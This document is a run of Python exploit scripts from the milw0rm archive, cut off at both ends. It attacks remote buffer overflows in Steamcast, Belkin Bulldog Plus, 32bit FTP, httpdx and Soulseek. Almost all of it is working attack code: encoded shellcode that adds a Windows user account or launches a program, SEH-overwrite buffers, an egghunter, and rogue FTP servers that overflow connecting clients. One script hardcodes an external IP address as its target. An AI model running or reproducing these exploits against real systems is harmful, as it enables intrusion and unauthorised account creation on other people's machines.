	head += "Host: "+host+"\r\n"
	head += exploit+"\r\n"
	head += "\r\n\r\n"

	s.send(head)

# milw0rm.com [2009-04-13]
#!/usr/bin/python
#[*] Usage   : steamcast.py [victime_ip]
#[*] Bug     : Steamcast(HTTP Request) Remote Buffer Overflow Exploit (SEH) [2]
#[*] Founder : Luigi Auriemma, thx to overflow3r for informing me about the vuln.        
#[*] Tested on :    Xp sp2 (fr)
#[*] Exploited by : His0k4
#[*] Greetings :    All friends & muslims HaCkErs (DZ),snakespc.com,secdz.com
#[*] Chi3arona houa : Serra7 merra7,koulchi mderra7 :D
#[*] Translate by Cyb3r-1st : esse7 embe7 embou :p

#Short Description : The previous exploit runs  small shellcodes only, this one is the opposite :)
#Note : The problem is that we need to find a dll wich its not compiled with GS, in my case i founded idmmbc its a loaded dll of internet download manager so try to find an unsafe dll.
#Other note : The shellcode will be executed when the program will be closed.
#Another one : When you have problems with running the exploit msg me before you msg str0ke.

import sys, socket
import struct

host = sys.argv[1] 
port = 8000


# win32_adduser -  PASS=27 EXITFUNC=seh USER=dz Size=228 Encoder=PexFnstenvSub http://metasploit.com
shellcode=(
"\x44\x7A\x32\x37\x44\x7A\x32\x37\x29\xc9\x83\xe9\xcd\xd9\xee\xd9"
"\x74\x24\xf4\x5b\x81\x73\x13\x05\x16\xf2\x06\x83\xeb\xfc\xe2\xf4"
"\xf9\xfe\xb6\x06\x05\x16\x79\x43\x39\x9d\x8e\x03\x7d\x17\x1d\x8d"
"\x4a\x0e\x79\x59\x25\x17\x19\x4f\x8e\x22\x79\x07\xeb\x27\x32\x9f"
"\xa9\x92\x32\x72\x02\xd7\x38\x0b\x04\xd4\x19\xf2\x3e\x42\xd6\x02"
"\x70\xf3\x79\x59\x21\x17\x19\x60\x8e\x1a\xb9\x8d\x5a\x0a\xf3\xed"
"\x8e\x0a\x79\x07\xee\x9f\xae\x22\x01\xd5\xc3\xc6\x61\x9d\xb2\x36"
"\x80\xd6\x8a\x0a\x8e\x56\xfe\x8d\x75\x0a\x5f\x8d\x6d\x1e\x19\x0f"
"\x8e\x96\x42\x06\x05\x16\x79\x6e\x39\x49\xc3\xf0\x65\x40\x7b\xfe"
"\x86\xd6\x89\x56\x6d\xe6\x78\x02\x5a\x7e\x6a\xf8\x8f\x18\xa5\xf9"
"\xe2\x75\x9f\x62\x2b\x73\x8a\x63\x25\x39\x91\x26\x6b\x73\x86\x26"
"\x70\x65\x97\x74\x25\x72\x88\x26\x37\x21\xd2\x29\x44\x52\xb6\x26"
"\x23\x30\xd2\x68\x60\x62\xd2\x6a\x6a\x75\x93\x6a\x62\x64\x9d\x73"
"\x75\x36\xb3\x62\x68\x7f\x9c\x6f\x76\x62\x80\x67\x71\x79\x80\x75"
"\x25\x72\x88\x26\x2a\x57\xb6\x42\x05\x16\xf2\x06")

shellunt=(
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x44\x7A\x32\x37\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")


exploit = "\x90"*(1003-len(shellcode)) + shellcode + "\xEB\x06\x90\x90" + "\xDB\x27\x02\x10" + "\x90"*20 + shellunt

#It needs a loop to works
while 1:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	head =  "GET / HTTP/1.1\r\n"
	head += "Host: "+host+"\r\n"
	head += exploit+"\r\n"
	head += "\r\n\r\n"

	s.send(head)

# milw0rm.com [2009-04-13]
#!/usr/bin/python
# _  _   _         __    _     _ _  
#| || | (_)  ___  /  \  | |__ | | | 
#| __ | | | (_-< | () | | / / |_  _|
#|_||_| |_| /__/  \__/  |_\_\   |_| 
#
#[*] Usage   : belkin.py [victime_ip]
#[*] Bug     : Belkin Bulldog Plus HTTP Server Remote Buffer Overflow Exploit
#[*] Credits go to : Elazar Broad
#[*] Tested on :    Xp sp3 (EN)(VB)
#[*] Exploited by : His0k4
#[*] Greetings :    All friends & muslims HaCkErs (DZ),snakespc.com
#[*] Chabiba wa sayd el ba7ri :D

import sys, socket
import base64

host = sys.argv[1] 
port = 80

# win32_adduser -  PASS=27 EXITFUNC=seh USER=DZ Size=477 Encoder=PexAlphaNum http://metasploit.com
shellcode=(
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54"
"\x42\x30\x42\x50\x42\x30\x4b\x38\x45\x34\x4e\x43\x4b\x58\x4e\x37"
"\x45\x50\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x34\x4a\x31\x4b\x58"
"\x4f\x35\x42\x42\x41\x30\x4b\x4e\x49\x54\x4b\x48\x46\x33\x4b\x48"
"\x41\x50\x50\x4e\x41\x43\x42\x4c\x49\x49\x4e\x4a\x46\x58\x42\x4c"
"\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x53\x46\x45\x46\x32\x46\x30\x45\x57\x45\x4e\x4b\x48"
"\x4f\x45\x46\x42\x41\x50\x4b\x4e\x48\x36\x4b\x58\x4e\x30\x4b\x34"
"\x4b\x58\x4f\x35\x4e\x31\x41\x30\x4b\x4e\x4b\x38\x4e\x41\x4b\x38"
"\x41\x30\x4b\x4e\x49\x38\x4e\x55\x46\x42\x46\x30\x43\x4c\x41\x53"
"\x42\x4c\x46\x46\x4b\x48\x42\x34\x42\x53\x45\x48\x42\x4c\x4a\x37"
"\x4e\x30\x4b\x58\x42\x34\x4e\x30\x4b\x48\x42\x57\x4e\x41\x4d\x4a"
"\x4b\x38\x4a\x46\x4a\x50\x4b\x4e\x49\x50\x4b\x38\x42\x58\x42\x4b"
"\x42\x50\x42\x30\x42\x50\x4b\x48\x4a\x46\x4e\x53\x4f\x45\x41\x53"
"\x48\x4f\x42\x46\x48\x45\x49\x38\x4a\x4f\x43\x58\x42\x4c\x4b\x37"
"\x42\x35\x4a\x36\x42\x4f\x4c\x38\x46\x50\x4f\x55\x4a\x56\x4a\x39"
"\x50\x4f\x4c\x48\x50\x30\x47\x45\x4f\x4f\x47\x4e\x43\x56\x4d\x56"
"\x46\x56\x50\x32\x45\x56\x4a\x57\x45\x36\x42\x32\x4f\x52\x43\x56"
"\x42\x52\x50\x36\x45\x46\x46\x57\x42\x42\x45\x37\x43\x47\x45\x46"
"\x44\x57\x42\x42\x46\x34\x4c\x55\x42\x42\x44\x43\x47\x53\x42\x52"
"\x4f\x52\x41\x54\x46\x44\x46\x34\x42\x32\x48\x42\x48\x42\x42\x52"
"\x50\x36\x45\x36\x46\x57\x42\x52\x4e\x36\x4f\x56\x43\x56\x41\x46"
"\x4e\x56\x47\x36\x44\x57\x4f\x56\x45\x57\x42\x57\x42\x32\x41\x54"
"\x46\x36\x4d\x36\x49\x46\x50\x46\x49\x46\x43\x57\x46\x57\x44\x37"
"\x41\x46\x46\x37\x4f\x46\x44\x37\x43\x47\x42\x32\x46\x54\x4c\x35"
"\x42\x52\x4f\x42\x41\x54\x46\x44\x46\x54\x42\x50\x5a")

jump="\xFF\x54\x24\x58" #Jump to the GET request wich contains our shellcode.

ret="\xFF\x17\x49\x7E" #Friendly jmp esp "user32.dll".

junk = "\x41"*16

exploit1 = base64.encodestring(ret + jump + junk)
exploit2 = shellcode

head =  'GET '+exploit2+' HTTP/1.1\r\n'
head += 'Authorization: Basic '+exploit1+'\r\n\r\n'

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(head)

# milw0rm.com [2009-04-27]
#!/usr/bin/python
# _  _   _         __    _     _ _  
#| || | (_)  ___  /  \  | |__ | | | 
#| __ | | | (_-< | () | | / / |_  _|
#|_||_| |_| /__/  \__/  |_\_\   |_| 
#
#[*] Bug     : 32bit FTP (09.04.24) (CWD response) Remote Buffer Overflow Exploit
#[*] Refer : http://www.milw0rm.com/exploits/8611
#[*] Tested on :    Xp sp3 (EN)(VB)
#[*] Exploited by : His0k4
#[*] Greetings :    All friends & muslims HaCkErs (DZ),Algerians Elites,snakespc.com
#[*] Serra7 Merra7 koulchi mderra7 :p

from socket import *

payload = "\x41"*1020
payload += "\x67\x86\x86\x7C" # jmp esp kernel32.dll

 # win32_exec -  EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com
payload += (
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44"
"\x42\x50\x42\x30\x42\x50\x4b\x38\x45\x54\x4e\x53\x4b\x38\x4e\x47"
"\x45\x30\x4a\x37\x41\x50\x4f\x4e\x4b\x58\x4f\x54\x4a\x31\x4b\x58"
"\x4f\x45\x42\x32\x41\x30\x4b\x4e\x49\x54\x4b\x48\x46\x43\x4b\x38"
"\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x49\x4e\x4a\x46\x48\x42\x4c"
"\x46\x47\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x33\x46\x35\x46\x42\x46\x30\x45\x37\x45\x4e\x4b\x58"
"\x4f\x55\x46\x52\x41\x50\x4b\x4e\x48\x36\x4b\x48\x4e\x50\x4b\x54"
"\x4b\x38\x4f\x35\x4e\x31\x41\x30\x4b\x4e\x4b\x38\x4e\x31\x4b\x58"
"\x41\x50\x4b\x4e\x49\x38\x4e\x35\x46\x52\x46\x30\x43\x4c\x41\x43"
"\x42\x4c\x46\x46\x4b\x48\x42\x34\x42\x43\x45\x48\x42\x4c\x4a\x47"
"\x4e\x50\x4b\x48\x42\x34\x4e\x30\x4b\x48\x42\x47\x4e\x51\x4d\x4a"
"\x4b\x38\x4a\x46\x4a\x30\x4b\x4e\x49\x30\x4b\x58\x42\x38\x42\x4b"
"\x42\x30\x42\x30\x42\x30\x4b\x48\x4a\x36\x4e\x53\x4f\x55\x41\x43"
"\x48\x4f\x42\x46\x48\x55\x49\x58\x4a\x4f\x43\x58\x42\x4c\x4b\x37"
"\x42\x35\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x4a\x46\x4a\x59"
"\x50\x4f\x4c\x58\x50\x50\x47\x35\x4f\x4f\x47\x4e\x43\x56\x41\x56"
"\x4e\x56\x43\x36\x42\x30\x5a")

s = socket(AF_INET, SOCK_STREAM)
s.bind(("0.0.0.0", 21))
s.listen(1)
print "[+] Listening on [FTP] 21"
c, addr = s.accept()

print "[+] Connection accepted from: %s" % (addr[0])

c.send("220 Hello\r\n")
c.recv(1024)
c.send("331 pwd please\r\n")
c.recv(1024)
c.send("230 OK\r\n")
c.recv(1024)
c.send("250 CWD command successful.\r\n")
c.recv(1024)
c.send("257 "+payload+" is current directory.")
c.close()
raw_input("[+] Done, press enter to quit")
s.close()

# milw0rm.com [2009-05-05]
#!/usr/bin/python
# _  _   _         __    _     _ _  
#| || | (_)  ___  /  \  | |__ | | | 
#| __ | | | (_-< | () | | / / |_  _|
#|_||_| |_| /__/  \__/  |_\_\   |_| 
#
#[*] Bug     : 32bit FTP (09.04.24) (Banner) Remote Buffer Overflow Exploit
#[*] Founder : Load 99%
#[*] Tested on :    Xp sp3 (EN)(VB)
#[*] Exploited by : His0k4
#[*] Greetings :    All friends & muslims HaCkErs (DZ),Algerians Elites,snakespc.com
#[*] Serra7 Merra7 koulchi mderra7 :p

from socket import *

payload = "\x41"*989
payload += "\x67\x86\x86\x7C" # jmp esp kernerl32.dll

 # win32_exec -  EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com
payload += (
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44"
"\x42\x50\x42\x30\x42\x50\x4b\x38\x45\x54\x4e\x53\x4b\x38\x4e\x47"
"\x45\x30\x4a\x37\x41\x50\x4f\x4e\x4b\x58\x4f\x54\x4a\x31\x4b\x58"
"\x4f\x45\x42\x32\x41\x30\x4b\x4e\x49\x54\x4b\x48\x46\x43\x4b\x38"
"\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x49\x4e\x4a\x46\x48\x42\x4c"
"\x46\x47\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x33\x46\x35\x46\x42\x46\x30\x45\x37\x45\x4e\x4b\x58"
"\x4f\x55\x46\x52\x41\x50\x4b\x4e\x48\x36\x4b\x48\x4e\x50\x4b\x54"
"\x4b\x38\x4f\x35\x4e\x31\x41\x30\x4b\x4e\x4b\x38\x4e\x31\x4b\x58"
"\x41\x50\x4b\x4e\x49\x38\x4e\x35\x46\x52\x46\x30\x43\x4c\x41\x43"
"\x42\x4c\x46\x46\x4b\x48\x42\x34\x42\x43\x45\x48\x42\x4c\x4a\x47"
"\x4e\x50\x4b\x48\x42\x34\x4e\x30\x4b\x48\x42\x47\x4e\x51\x4d\x4a"
"\x4b\x38\x4a\x46\x4a\x30\x4b\x4e\x49\x30\x4b\x58\x42\x38\x42\x4b"
"\x42\x30\x42\x30\x42\x30\x4b\x48\x4a\x36\x4e\x53\x4f\x55\x41\x43"
"\x48\x4f\x42\x46\x48\x55\x49\x58\x4a\x4f\x43\x58\x42\x4c\x4b\x37"
"\x42\x35\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x4a\x46\x4a\x59"
"\x50\x4f\x4c\x58\x50\x50\x47\x35\x4f\x4f\x47\x4e\x43\x56\x41\x56"
"\x4e\x56\x43\x36\x42\x30\x5a")

s = socket(AF_INET, SOCK_STREAM)
s.bind(("0.0.0.0", 21))
s.listen(1)
print "[+] Listening on [FTP] 21"
c, addr = s.accept()

print "[+] Connection accepted from: %s" % (addr[0])

c.send("220 "+payload+"\r\n")
c.recv(1024)
c.close()
raw_input("[+] Done, press enter to quit")
s.close()

# milw0rm.com [2009-05-05]
#!/usr/bin/python
# _  _   _         __    _     _ _  
#| || | (_)  ___  /  \  | |__ | | | 
#| __ | | | (_-< | () | | / / |_  _|
#|_||_| |_| /__/  \__/  |_\_\   |_| 
#
#[*] Bug     : 32bit FTP (09.04.24) (CWD Response) Universal Seh Overwrite Exploit
#[*] Refer : http://www.milw0rm.com/exploits/8611
#[*] Tested on :    Xp sp3 (EN)(VB)
#[*] Exploited by : His0k4
#[*] Greetings :    All friends & muslims HaCkErs (DZ),Algerians Elites,snakespc.com
#[*] Serra7 Merra7 koulchi mderra7 :p

from socket import *

# win32_exec -  EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com
shellcode=(
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54"
"\x42\x30\x42\x30\x42\x30\x4b\x48\x45\x54\x4e\x43\x4b\x48\x4e\x57"
"\x45\x30\x4a\x47\x41\x30\x4f\x4e\x4b\x58\x4f\x54\x4a\x31\x4b\x38"
"\x4f\x35\x42\x52\x41\x30\x4b\x4e\x49\x34\x4b\x58\x46\x33\x4b\x38"
"\x41\x50\x50\x4e\x41\x33\x42\x4c\x49\x59\x4e\x4a\x46\x38\x42\x4c"
"\x46\x47\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x33\x46\x55\x46\x52\x46\x30\x45\x57\x45\x4e\x4b\x58"
"\x4f\x45\x46\x52\x41\x50\x4b\x4e\x48\x56\x4b\x38\x4e\x30\x4b\x54"
"\x4b\x38\x4f\x55\x4e\x31\x41\x50\x4b\x4e\x4b\x58\x4e\x31\x4b\x58"
"\x41\x30\x4b\x4e\x49\x58\x4e\x35\x46\x32\x46\x30\x43\x4c\x41\x53"
"\x42\x4c\x46\x46\x4b\x58\x42\x54\x42\x33\x45\x38\x42\x4c\x4a\x57"
"\x4e\x30\x4b\x48\x42\x44\x4e\x50\x4b\x58\x42\x47\x4e\x31\x4d\x4a"
"\x4b\x58\x4a\x56\x4a\x30\x4b\x4e\x49\x30\x4b\x58\x42\x38\x42\x4b"
"\x42\x30\x42\x50\x42\x30\x4b\x58\x4a\x36\x4e\x53\x4f\x45\x41\x53"
"\x48\x4f\x42\x56\x48\x45\x49\x58\x4a\x4f\x43\x48\x42\x4c\x4b\x47"
"\x42\x35\x4a\x36\x42\x4f\x4c\x38\x46\x30\x4f\x55\x4a\x46\x4a\x59"
"\x50\x4f\x4c\x48\x50\x30\x47\x35\x4f\x4f\x47\x4e\x43\x36\x41\x56"
"\x4e\x46\x43\x46\x42\x50\x5a")

buffer =   '\x41'*4335
buffer +=  shellcode
buffer +=  '\xE9\xA4\xFE\xFF\xFF' # nro7o nro7o lel shellcode nro7o :p
buffer +=  '\x90'*49
buffer +=  '\x74\xC8\x90\x90' # to the end and its a new Beginning ;)
buffer +=  '\x30\x14\x45\x00' #universal pop-pop-ret 32bitftp.exe

s = socket(AF_INET, SOCK_STREAM)
s.bind(("0.0.0.0", 21))
s.listen(1)
print "[+] Listening on [FTP] 21"
c, addr = s.accept()

print "[+] Connection accepted from: %s" % (addr[0])

c.send("220 chtawala chtakayen\r\n")
c.recv(1024)
c.send("331 pwd please\r\n")
c.recv(1024)
c.send("230 OK\r\n")
c.recv(1024)
c.send("250 CWD command successful.\r\n")
c.recv(1024)
c.send("257 "+buffer+" is current directory.")
c.close()
raw_input("[+] Done, press enter to quit")
s.close()

# milw0rm.com [2009-05-05]
#!/usr/bin/python
#[*] Usage : httpdx.py [target_ip]
# _  _   _         __    _     _ _  
#| || | (_)  ___  /  \  | |__ | | | 
#| __ | | | (_-< | () | | / / |_  _|
#|_||_| |_| /__/  \__/  |_\_\   |_| 
#
#[*] Bug     : httpdx <= 0.5b FTP Server (USER) Remote BOF Exploit (SEH)
#[*] Founder :  sico2819
#[*] Tested on :    Xp sp3 (EN)(VB)
#[*] Exploited by : His0k4
#[*] Greetings :    All friends & muslims HaCkErs (DZ),Algerians Elites,snakespc.com
#[*] Serra7 Merra7 koulchi mderra7 :p

#[x] Note : I used the case when idm is installed because its dll (idmmbc.dll) is loaded with httpdx.

import socket
import sys

host = sys.argv[1] 

# win32_exec -  EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com
shellcode=(
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x34"
"\x42\x50\x42\x50\x42\x50\x4b\x48\x45\x34\x4e\x33\x4b\x58\x4e\x37"
"\x45\x30\x4a\x57\x41\x50\x4f\x4e\x4b\x48\x4f\x34\x4a\x41\x4b\x58"
"\x4f\x45\x42\x42\x41\x30\x4b\x4e\x49\x34\x4b\x58\x46\x33\x4b\x38"
"\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x59\x4e\x4a\x46\x58\x42\x4c"
"\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x53\x46\x45\x46\x32\x46\x30\x45\x57\x45\x4e\x4b\x58"
"\x4f\x45\x46\x52\x41\x30\x4b\x4e\x48\x36\x4b\x38\x4e\x50\x4b\x44"
"\x4b\x58\x4f\x55\x4e\x41\x41\x50\x4b\x4e\x4b\x48\x4e\x51\x4b\x48"
"\x41\x30\x4b\x4e\x49\x48\x4e\x35\x46\x32\x46\x50\x43\x4c\x41\x33"
"\x42\x4c\x46\x36\x4b\x38\x42\x44\x42\x43\x45\x38\x42\x4c\x4a\x47"
"\x4e\x50\x4b\x48\x42\x54\x4e\x30\x4b\x38\x42\x47\x4e\x41\x4d\x4a"
"\x4b\x38\x4a\x36\x4a\x50\x4b\x4e\x49\x50\x4b\x58\x42\x58\x42\x4b"
"\x42\x50\x42\x50\x42\x30\x4b\x48\x4a\x56\x4e\x43\x4f\x35\x41\x53"
"\x48\x4f\x42\x36\x48\x45\x49\x38\x4a\x4f\x43\x38\x42\x4c\x4b\x57"
"\x42\x35\x4a\x36\x42\x4f\x4c\x58\x46\x50\x4f\x55\x4a\x56\x4a\x49"
"\x50\x4f\x4c\x48\x50\x50\x47\x45\x4f\x4f\x47\x4e\x43\x46\x41\x56"
"\x4e\x36\x43\x36\x42\x30\x5a")

payload =  shellcode
payload += '\x41'*(877 - len(shellcode))
payload += '\xE9\x8E\xFC\xFF\xFF'
payload += '\x90'*48
payload += '\x74\xC9\x90\x90'
payload += '\x87\x23\x02\x10'
payload += '\x44'*9000

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((host,21))
s.recv(1024)
s.send('USER '+payload+'\r\n')
raw_input("[+] Done, press enter to quit")
s.close()

# milw0rm.com [2009-05-18]
#!/usr/bin/python
#[*] Usage : httpdx_cwd.py [target_ip] user pass 
#[*] Example : httpdx_cwd.py 192.168.1.3 ftp 123
# Stack encouraged me to exploit this bug , so thx brotha
# _  _   _         __    _     _ _  
#| || | (_)  ___  /  \  | |__ | | | 
#| __ | | | (_-< | () | | / / |_  _|
#|_||_| |_| /__/  \__/  |_\_\   |_| 
#
#[*] Bug     : httpdx <= 0.5b FTP Server (CWD) Remote BOF Exploit (SEH)
#[*] Refer :  sico2819
#[*] Tested on :    Xp sp3 (EN)(VB)
#[*] Exploited by : His0k4
#[*] Greetings :    All friends & muslims HaCkErs (DZ),Algerians Elites,snakespc.com
#[*] Serra7 Merra7 koulchi mderra7 :p

#[x] Note : I used the case when idm is installed because its dll (idmmbc.dll) is loaded with httpdx.

import socket,sys,struct

def banner():
        print "\nhttpdx <= 0.5b FTP Server (CWD) Remote Buffer Overflow Exploit.\n"
        print "By: His0k4\n"
 
if len(sys.argv)!=4:
        banner()
        print "Usage: %s <ip> <user> <pass>" %sys.argv[0]
        sys.exit(0)

# skape's egghunter shellcode
shellunt=(
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x44\x7A\x32\x37\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

# win32_adduser -  PASS=27 EXITFUNC=seh USER=dz Size=228 Encoder=PexFnstenvSub http://metasploit.com
shellcode=(
"\x44\x7A\x32\x37\x44\x7A\x32\x37\x29\xc9\x83\xe9\xcd\xd9\xee\xd9"
"\x74\x24\xf4\x5b\x81\x73\x13\x05\x16\xf2\x06\x83\xeb\xfc\xe2\xf4"
"\xf9\xfe\xb6\x06\x05\x16\x79\x43\x39\x9d\x8e\x03\x7d\x17\x1d\x8d"
"\x4a\x0e\x79\x59\x25\x17\x19\x4f\x8e\x22\x79\x07\xeb\x27\x32\x9f"
"\xa9\x92\x32\x72\x02\xd7\x38\x0b\x04\xd4\x19\xf2\x3e\x42\xd6\x02"
"\x70\xf3\x79\x59\x21\x17\x19\x60\x8e\x1a\xb9\x8d\x5a\x0a\xf3\xed"
"\x8e\x0a\x79\x07\xee\x9f\xae\x22\x01\xd5\xc3\xc6\x61\x9d\xb2\x36"
"\x80\xd6\x8a\x0a\x8e\x56\xfe\x8d\x75\x0a\x5f\x8d\x6d\x1e\x19\x0f"
"\x8e\x96\x42\x06\x05\x16\x79\x6e\x39\x49\xc3\xf0\x65\x40\x7b\xfe"
"\x86\xd6\x89\x56\x6d\xe6\x78\x02\x5a\x7e\x6a\xf8\x8f\x18\xa5\xf9"
"\xe2\x75\x9f\x62\x2b\x73\x8a\x63\x25\x39\x91\x26\x6b\x73\x86\x26"
"\x70\x65\x97\x74\x25\x72\x88\x26\x37\x21\xd2\x29\x44\x52\xb6\x26"
"\x23\x30\xd2\x68\x60\x62\xd2\x6a\x6a\x75\x93\x6a\x62\x64\x9d\x73"
"\x75\x36\xb3\x62\x68\x7f\x9c\x6f\x76\x62\x80\x67\x71\x79\x80\x75"
"\x25\x72\x88\x26\x2a\x57\xb6\x42\x05\x16\xf2\x06")

payload = '\x41'*26
payload += shellunt
payload += '\xEB\xDE\x90\x90'
payload += '\x87\x23\x02\x10'
payload += '\x44'*900

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	s.connect((sys.argv[1],21))
except:
	print "Can\'t connect to server!\n"
	sys.exit(0)

s.recv(1024)
s.send('USER '+sys.argv[2]+'\r\n')
s.recv(1024)
s.send('PASS '+sys.argv[3]+'\r\n')
s.recv(1024)
s.send('MKD '+shellcode+'\r\n') # i placed the shellcode in the MKD command ;)
s.recv(1024)
s.send('CWD '+payload+'\r\n')
print ("Egghunter is hunting...;)")
raw_input("[+] Shellcode will be executed when httpdx get closed")
s.close()

# milw0rm.com [2009-05-19]
#!/usr/bin/python
#[x] Bug :Soulseek 157 NS Remote Seh Overwrite Exploit
#[x] Credits & poc from : http://www.milw0rm.com/exploits/8777
#[x] Tested on : Windows Xp (sp3), Soulseek 157 NS 12d
#[x] The exploit attacks the user :"test4321"

import struct
import sys, socket
from time import *

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("208.76.170.50",2242))  # Change to Port 2240 for 156* branch

request = "\x48\x00\x00\x00\x01\x00\x00\x00\x08\x00\x00\x00"
request += "testt4321" # username
request += "\x08\x00\x00\x00"
request += "12345678" # password
request += "\xb5\x00\x00\x00\x20\x00\x00\x00"
request += "\x38\x65\x39\x31\x66\x37\x33\x30\x35\x35\x37\x31\x32\x35\x64\x37"
request += "\x34\x39\x32\x34\x62\x64\x66\x35\x63\x32\x39\x61\x36\x37\x64\x61"
request += "\x01\x00\x00\x00"

s.send(request)
sleep(1)

# win32_exec -  EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com
shellcode=(
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54"
"\x42\x50\x42\x30\x42\x30\x4b\x38\x45\x44\x4e\x43\x4b\x38\x4e\x57"
"\x45\x50\x4a\x57\x41\x50\x4f\x4e\x4b\x48\x4f\x54\x4a\x51\x4b\x38"
"\x4f\x35\x42\x32\x41\x30\x4b\x4e\x49\x44\x4b\x38\x46\x33\x4b\x38"
"\x41\x50\x50\x4e\x41\x43\x42\x4c\x49\x59\x4e\x4a\x46\x38\x42\x4c"
"\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x43\x46\x55\x46\x42\x46\x30\x45\x57\x45\x4e\x4b\x48"
"\x4f\x55\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x38\x4e\x30\x4b\x44"
"\x4b\x38\x4f\x55\x4e\x41\x41\x50\x4b\x4e\x4b\x58\x4e\x51\x4b\x38"
"\x41\x30\x4b\x4e\x49\x48\x4e\x45\x46\x42\x46\x30\x43\x4c\x41\x53"
"\x42\x4c\x46\x56\x4b\x48\x42\x44\x42\x53\x45\x48\x42\x4c\x4a\x47"
"\x4e\x30\x4b\x38\x42\x34\x4e\x50\x4b\x48\x42\x37\x4e\x31\x4d\x4a"
"\x4b\x48\x4a\x36\x4a\x30\x4b\x4e\x49\x30\x4b\x38\x42\x58\x42\x4b"
"\x42\x30\x42\x50\x42\x50\x4b\x48\x4a\x36\x4e\x43\x4f\x55\x41\x53"
"\x48\x4f\x42\x56\x48\x55\x49\x48\x4a\x4f\x43\x38\x42\x4c\x4b\x37"
